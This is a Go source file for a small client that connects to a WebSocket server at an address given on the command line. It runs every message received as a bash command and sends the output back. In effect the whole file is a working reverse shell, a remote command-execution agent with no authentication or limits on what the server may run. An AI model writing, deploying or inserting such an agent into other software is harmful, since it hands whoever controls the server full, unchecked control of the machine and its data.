package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"

	"github.com/gorilla/websocket"
)

func main() {
	// Connect to the WebSocket server
	c, _, err := websocket.DefaultDialer.Dial(fmt.Sprintf("ws://%s:%s/ws", os.Args[1], os.Args[2]), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	// Listen for commands from the server
	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			return
		}
		log.Printf("Received command: %s", message)

		// Execute the received command
		cmd := exec.Command("/bin/bash", "-c", string(message))
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\nError: "+err.Error())...)
		}

		// Send the command output back to the server
		if err := c.WriteMessage(websocket.TextMessage, output); err != nil {
			log.Println("write:", err)
			return
		}
	}
}
